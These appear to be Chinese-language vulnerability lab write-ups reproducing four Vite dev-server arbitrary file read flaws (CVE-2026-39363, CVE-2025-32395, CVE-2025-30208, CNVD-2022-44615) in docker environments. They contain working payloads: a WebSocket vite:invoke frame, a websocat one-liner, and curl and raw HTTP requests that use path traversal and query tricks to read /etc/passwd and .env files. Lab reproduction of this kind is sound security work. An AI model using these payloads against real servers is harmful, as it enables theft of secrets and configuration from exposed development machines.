# Vite 开发服务器 WebSocket 任意文件读取漏洞（CVE-2026-39363）

Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用 Rollup 打包代码的构建命令。

在 Vite 6.0.0 至 6.4.2 之前、7.0.0 至 7.3.2 之前以及 8.0.0 至 8.0.5 之前的版本中，HTTP 请求路径上强制执行的文件系统访问控制（如 `server.fs.allow` 和 `server.fs.deny`）并未应用于开发服务器 WebSocket 暴露的 `fetchModule` 方法。攻击者只要能够访问 WebSocket 接口，就可以通过自定义事件 `vite:invoke` 调用 `fetchModule`，并结合 `file://` 协议与 `?raw`（或 `?inline`）查询参数，将服务器上的任意文件以 JavaScript 模块字符串的形式读取出来。

只有显式将 Vite 开发服务器暴露到网络（使用 `--host` 参数或 `server.host` 配置项）的应用才会受到影响，因为默认仅监听回环地址时远程攻击者无法访问该 WebSocket 接口。

参考链接：

- <https://github.com/vitejs/vite/security/advisories/GHSA-p9ff-h696-f583>
- <https://nvd.nist.gov/vuln/detail/CVE-2026-39363>

## 环境搭建

执行以下命令启动 Vite 7.3.1 开发服务器：

```
docker compose up -d
```

服务器启动后，可以通过访问 `http://your-ip:5173` 来访问 Vite 开发服务器。

## 漏洞复现

漏洞利用入口是 Vite HMR 的 WebSocket 接口，该接口使用 `vite-hmr` 子协议。攻击者发送一个自定义的 `vite:invoke` 事件，其负载会调用 `fetchModule` 方法并传入以 `?raw` 结尾的 `file://` URL，即可将任意文件以 JavaScript 模块字符串的形式读取出来。

首先，打开 Burp Suite，使用 Repeater 中的 WebSocket 功能（或独立的 WebSocket 工具）向 `your-ip:5173` 发起一个新的 WebSocket 连接，升级请求如下。注意这个请求刻意没有携带 `Origin` 头——当 Vite 开发服务器通过 `--host` 暴露到网络时，它会拒绝 `Origin` 不在可信列表中的 WebSocket 升级请求，但会放行不带 `Origin` 的请求，而这正是非浏览器客户端的默认行为。如果你是从浏览器抓包后再重放，记得先把 `Origin` 那一行删掉，否则服务端会返回 `400 Bad Request`：

```
GET / HTTP/1.1
Host: your-ip:5173
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: vite-hmr

```

![Burp Repeater 中配置的 vite-hmr WebSocket 升级请求](1.png)

升级成功后，服务端会立即推送一个 `{"type":"connected"}` 欢迎帧。然后，发送如下 JSON 作为 WebSocket 文本帧：

```
{"type":"custom","event":"vite:invoke","data":{"id":"send:0","name":"fetchModule","data":["file:///etc/passwd?raw"]}}
```

开发服务器会返回另一个 `vite:invoke` 帧，其 `data.result.code` 字段中包含 `/etc/passwd` 文件内容，并以 JavaScript 模块默认导出的形式输出：

![WebSocket 响应中包含/etc/passwd 内容的 JavaScript 模块](2.png)

如截图所示，服务器上的 `/etc/passwd` 文件内容已经通过开发服务器的 WebSocket 成功读取出来，漏洞利用确认成功。

同样的 Payload 也可以将 `?raw` 替换为 `?inline` 使用。通过修改目标路径，可以读取 Node.js 进程有权限访问的任意文件，例如应用源码、配置文件或 `.env` 等环境变量文件。

如果更习惯使用命令行工具而非图形界面，也可以用 `websocat` 一行命令复现这个漏洞：

```
echo '{"type":"custom","event":"vite:invoke","data":{"id":"send:0","name":"fetchModule","data":["file:///etc/passwd?raw"]}}' \
    | websocat -n1 --protocol vite-hmr ws://your-ip:5173/
```

# Vite 开发服务器通过 Hash 字符绕过任意文件读取漏洞（CVE-2025-32395）

Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用 Rollup 打包代码的构建命令。

在 Vite 6.2.6、6.1.5、6.0.15、5.4.18 和 4.5.13 版本之前，`server.fs.deny` 功能可以通过在 URL 中使用井号字符（`#`）来绕过。根据 RFC 9112 规范，`#` 字符不允许出现在 HTTP 请求目标字段中。然而，Node.js 和 Bun 并不会拒绝此类无效请求，而是将它们传递给用户代码。Vite 的路径校验未考虑井号字符的影响，导致攻击者可以绕过文件访问限制，读取文件系统上的任意文件。

这个漏洞是 [CVE-2025-30208](../CVE-2025-30208/README.zh-cn.md) 补丁的绕过。

参考链接：

- <https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-32395>

## 环境搭建

执行以下命令启动 Vite 6.2.5 开发服务器：

```
docker compose up -d
```

服务器启动后，可以通过访问 `http://your-ip:5173` 来访问 Vite 开发服务器。

## 漏洞复现

该漏洞允许攻击者利用 HTTP 请求目标中的非法井号字符来绕过 `server.fs.deny` 保护，从而读取服务器文件系统上的任意文件。

首先，向 `http://your-ip:5173/@fs/etc/passwd` 发送请求，验证对允许目录之外的文件的访问会被正确拦截。你应该收到 403 Forbidden 响应：

![](1.png)

然后，发送以下包含井号字符（`#`）的 HTTP 请求。`#` 会导致 Vite 的 `server.fs.deny` 校验失效，而路径穿越序列（`/../`）则会导航到目标文件：

```
GET /@fs/usr/src/#/../../../../../etc/passwd HTTP/1.1
Host: your-ip:5173
```

由于 `#` 通常被 HTTP 客户端视为 URL 片段分隔符，不会被发送到服务器，因此需要使用 HTTP 调试工具或 curl 的 `--request-target` 参数来发送该原始请求：

```
curl --request-target '/@fs/usr/src/#/../../../../../etc/passwd' http://your-ip:5173
```

服务器将成功返回 `/etc/passwd` 文件的内容：

![](2.png)

# Vite 开发服务器任意文件读取漏洞绕过（CVE-2025-30208）

Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用 Rollup 打包代码的构建命令。

在 Vite 6.2.3、6.1.2、6.0.12、5.4.15 和 4.5.10 版本之前，用于限制访问 Vite 服务允许列表之外的文件的 `server.fs.deny` 功能可被绕过。通过在 URL 的 `@fs` 前缀后增加 `?raw??` 或 `?import&raw??`，攻击者可以读取文件系统上的任意文件。

此漏洞发生的原因是，在请求处理过程中尾部分隔符（如 `?`）在多个地方被移除，但在查询字符串正则表达式中没有考虑，导致安全检查被绕过。

这个漏洞是 [CNVD-2022-44615](../CNVD-2022-44615/README.zh-cn.md) 补丁的绕过。

参考链接：

- <https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-30208>

## 环境搭建

执行以下命令启动 Vite 6.2.2 开发服务器：

```
docker compose up -d
```

服务器启动后，可以通过访问 `http://your-ip:5173` 来访问 Vite 开发服务器。

> 注意：旧版本 Vite 的开发服务器默认端口为 3000，新版本默认端口为 5173，请注意区分。

## 漏洞复现

尝试使用标准的 `@fs` 前缀访问 `/etc/passwd`，测试正常访问是否会被限制：

![](1.png)

可见，当发送请求到 `http://your-ip:5173/@fs/etc/passwd` 时，你会收到 403 Forbidden 响应，因为这个路径在 Vite 服务的允许范围之外。

通过在 URL 后附加 `?raw??`，你就可以绕过这个限制并获取文件内容：

```
curl "http://your-ip:5173/@fs/etc/passwd?raw??"
```

这个请求将会返回 `/etc/passwd` 文件的内容：

![](2.png)

除了上面的 Payload，你也可以使用 `?import&raw??` 来达到相同的效果。
# Vite 开发服务器任意文件读取漏洞（CNVD-2022-44615）

Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用 Rollup 打包代码的构建命令。

在 Vite 2.3.0 版本之前，可以通过 `@fs` 前缀读取文件系统上的任意文件。

参考链接：

- <https://github.com/vitejs/vite/issues/2820>

## 环境搭建

执行以下命令启动 Vite 2.1.5 开发服务器：

```bash
docker compose up -d
```

服务器启动后，可以通过访问 `http://your-ip:3000` 来访问 Vite 开发服务器。

> 注意：旧版本 Vite 的开发服务器默认端口为 3000，新版本默认端口为 5173，请注意区分。

## 漏洞复现

使用标准的 `@fs` 前缀访问 `/etc/passwd`，可以获取文件内容：

```bash
curl "http://your-ip:3000/@fs/etc/passwd"
```

![](1.png)
